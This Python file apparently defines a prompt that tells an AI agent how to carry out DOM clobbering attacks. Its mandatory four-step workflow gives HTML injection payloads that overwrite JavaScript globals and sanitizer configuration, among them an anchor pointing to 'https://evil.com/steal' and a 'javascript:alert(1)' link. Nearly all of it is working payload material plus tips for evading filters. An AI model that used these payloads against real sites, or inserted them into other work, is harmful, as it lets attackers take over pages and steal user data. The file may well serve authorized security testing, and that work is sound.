"""
DOM Clobbering Attack Skill Prompt.
"""

DOM_CLOBBERING_SKILL_PROMPT = """
## ATTACK SKILL: DOM CLOBBERING

### MANDATORY WORKFLOW

#### STEP 1: IDENTIFY GLOBAL VARIABLE REFERENCES
Look for JavaScript that references globals without `window.` prefix: `if (config.debug)`, `var url = defaultUrl || '/home'`

#### STEP 2: INJECT HTML NAMED ELEMENTS
```html
<form name="config"><input name="debug" value="true"></form>
<img name="defaultUrl" id="defaultUrl" src="x">
<a name="isAdmin" id="isAdmin" href="https://evil.com/steal">
```

#### STEP 3: DUAL-ID ATTACK
```html
<form id="config"><input id="debug" value="true"></form>
```
-> `window.config` becomes the form element, `window.config.debug` becomes the input.

#### STEP 4: ANCHOR INJECTION INTO SANITIZERS
If HTML sanitizer allows `<a>` tags with `id`:
```html
<a id="sanitizerConfig" href="javascript:alert(1)">click</a>
```
-> Overwrites sanitizer's config object reference.

#### ANTI-PATTERNS: Don't just try `<form name=x>` — also test `<img name=x>`, `<embed name=x>`, `<object name=x>`, `<a id=x>`.
"""
